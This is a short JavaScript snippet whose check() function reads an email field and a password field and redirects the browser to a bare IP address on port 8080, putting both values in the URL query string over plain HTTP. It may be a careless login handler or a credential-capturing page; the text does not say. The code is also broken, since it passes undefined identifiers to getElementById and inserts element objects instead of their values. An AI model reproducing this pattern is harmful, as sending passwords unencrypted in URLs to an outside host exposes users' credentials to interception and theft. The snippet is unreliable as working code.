function check() {
    var emailAddr = document.getElementById(emailAddr);
    var password = document.getElementById(password);
    window.location.href = "http://39.96.88.177:8080/login?emailAddr=" + emailAddr + "&password=" + password;

}
